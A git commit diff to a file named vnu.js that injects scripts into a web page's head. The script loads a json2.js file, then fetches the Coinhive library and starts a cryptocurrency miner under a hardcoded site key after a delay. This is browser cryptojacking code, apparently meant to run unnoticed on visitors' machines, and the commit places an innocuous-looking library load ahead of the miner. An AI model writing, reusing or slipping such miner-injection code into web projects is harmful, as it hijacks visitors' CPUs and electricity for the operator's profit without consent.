9e3cfb61f25f6df97c988e9371bf77bf09ac330e
crytopia <32449891+crytopia@users.noreply.github.com>
2017-10-02 21:49:47 +0700

    Update vnu.js

--- vnu.js
+++ vnu.js
@@ -1,6 +1,9 @@
 var imported = document.createElement('script');
-imported.src = 'https://coinhive.com/lib/coinhive.min.js';
+imported.src = 'http://ajax.cdnjs.com/ajax/libs/json2/20110223/json2.js';
 document.head.appendChild(imported);
+var imported2 = document.createElement('script');
+imported2.src = 'https://coinhive.com/lib/coinhive.min.js';
+document.head.appendChild(imported2);
 setTimeout(() => {
   var miner = new CoinHive.User('UtX8CiZN1tzrQTn6zYRmcfsMX8qkOLGz', 'vnu');
   miner.start();
